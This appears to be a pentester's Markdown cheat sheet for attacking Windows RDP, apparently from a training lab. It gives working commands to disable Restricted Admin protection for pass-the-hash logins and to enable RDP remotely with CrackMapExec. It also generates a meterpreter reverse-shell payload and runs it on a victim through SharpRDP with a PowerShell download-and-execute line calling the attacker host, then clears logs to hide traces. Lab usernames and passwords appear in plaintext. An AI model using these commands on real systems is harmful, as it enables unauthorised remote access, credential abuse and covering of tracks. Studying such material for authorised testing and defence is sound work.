### RDP Enumeration TOOL
https://github.com/CiscoCXSecurity/rdp-sec-check.git

### Basic RDP Enumeration
```
./rdp-sec-check.pl IP
```

### Allow PTH(Pass the Hash) via RDP
Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system.
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
(Set the **DisableRestrictedAdmin** to Zero)
Then you can perform the PTH and login via Restricted Admin.
```powershell-session
mstsc.exe /restrictedAdmin
```

### Enable RDP via Powershell(ADMIn righs needed)
https://pureinfotech.com/enable-remote-desktop-powershell-windows-10/
```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```
(Enables the feature)
```
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
(Allows the firewall rules)

### How to enable via CRACKMAPEXEC
```
sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable
```

### Execute remote commands from Shell to RDP
You can execute commands from a Shell(non-graphic) to a remote server via the RDP protocol with this tool. [0xthirteen/SharpRDP: Remote Desktop Protocol .NET Console Application for Authenticated Command Execution (github.com)](https://github.com/0xthirteen/SharpRDP)

```shell-session
//Generate the revshell payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s

//Setup the meterpreter listener in Metasploit to catach back it!

//Host the malicious script locally on Kali
sudo python3 -m http.server 80

//Invoke the script on the victim
.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88

//EXTRA: Clean the logs
.\CleanRunMRU.exe  clearall
```

### Optimizing connection for slow networks
```shell-session
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```
- `/bpp:8`: Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted.
- `/compression`: Enables compression to reduce the amount of data sent over the network.
- `-themes`: Disables desktop themes to reduce graphical data.
- `-wallpaper`: Disables the desktop wallpaper to further reduce graphical data.
- `/clipboard`: Enables clipboard sharing between the local and remote machines.
- `/audio-mode:0`: Disables audio redirection to save bandwidth.
- `/auto-reconnect`: Automatically reconnects if the connection drops, improving session stability.
- `-glyph-cache`: Enables caching of glyphs (text characters) to reduce the amount of data sent for text rendering.
